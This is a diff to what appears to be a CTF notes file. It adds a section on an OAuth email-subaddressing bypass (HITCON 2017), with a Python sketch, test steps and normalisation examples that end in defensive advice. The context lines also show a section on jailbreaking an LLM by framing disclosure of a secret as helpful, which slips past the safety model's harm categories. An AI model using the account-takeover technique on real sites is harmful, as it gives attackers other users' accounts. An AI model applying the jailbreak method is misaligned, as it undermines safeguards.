@@ -21,6 +21,7 @@
 - [HTTP TRACE Method Bypass (BYPASS CTF 2025)](#http-trace-method-bypass-bypass-ctf-2025)
 - [LLM/AI Chatbot Jailbreak (BYPASS CTF 2025)](#llmai-chatbot-jailbreak-bypass-ctf-2025)
 - [LLM Jailbreak with Safety Model Category Gaps (UTCTF 2026)](#llm-jailbreak-with-safety-model-category-gaps-utctf-2026)
+- [OAuth Email Subaddressing Bypass (HITCON 2017)](#oauth-email-subaddressing-bypass-hitcon-2017)
 - [Open Redirect Chains](#open-redirect-chains)
 - [Subdomain Takeover](#subdomain-takeover)
 - [Apache mod_status Information Disclosure + Session Forging (29c3 CTF 2012)](#apache-mod_status-information-disclosure--session-forging-29c3-ctf-2012)
@@ -511,6 +512,55 @@ def extract_via_code(host, port):
 - The model **wants** to be helpful — frame secret disclosure as helpful
 
 **Key insight:** Safety models protect against harmful content categories. Secret disclosure doesn't match any harm category, so it passes through unfiltered. The real challenge is often figuring out the flag FORMAT (which may differ from the CTF's standard format).
+
+---
+
+## OAuth Email Subaddressing Bypass (HITCON 2017)
+
+**Pattern:** Email subaddressing (`user+tag@domain.com`) delivers to `user@domain.com` but is treated as a distinct string. OAuth providers that skip email ownership verification allow registering `admin+anytag@domain.com` as a new identity. The relying party normalizes the email (strips `+tag`) and maps it to the existing admin account.
+
+```python
+import requests
+
+# Scenario: OAuth provider (e.g., Dropbox) lets you register with any email
+# without verifying ownership. Relying party maps OAuth email to its own users
+# using normalized email (stripping the +tag portion).
+
+# Step 1: Register with OAuth provider using subaddressed admin email
+oauth_register_payload = {
+    "email": "admin+attacker@example.com",   # delivers to admin@example.com
+    "password": "attacker_password"
+}
+# Register on OAuth provider (if it allows self-registration without verification)
+
+# Step 2: Initiate OAuth flow — get auth code for this "new" identity
+# Step 3: Relying party receives email "admin+attacker@example.com"
+# Step 4: Relying party normalizes: strips "+attacker" → "admin@example.com"
+# Step 5: Looks up existing account for admin@example.com → grants attacker admin access
+
+r = requests.get("http://target/oauth/callback",
+                 params={"code": oauth_code, "state": state})
+# Response: logged in as admin
+```
+
+**Identifying the vulnerability:**
+```bash
+# 1. Find the admin email from public info (about page, git commits, signup errors)
+# 2. Check if OAuth provider allows registration without email verification
+# 3. Check if relying party normalizes emails before account lookup
+
+# Test: register as "yourtestemail+x@gmail.com" via OAuth
+# If you're logged into yourtestemail@gmail.com account → vulnerable
+```
+
+**Email normalization variations:**
+```text
+user+tag@domain         → user@domain          (subaddressing, RFC 5321)
+user.name@gmail.com     → username@gmail.com   (Gmail dot normalization)
+USER@DOMAIN             → user@domain          (case folding)
+```
+
+**Key insight:** When an OAuth provider skips email verification and the relying party uses email as an identity key, `+tag` subaddressing creates shadow identities that map to any target account. The attacker controls a valid OAuth identity for `admin+x@domain` without owning `admin@domain`. Always verify email ownership in OAuth flows and use the provider-assigned unique user ID (not email) as the account identifier.
 
 ---
 
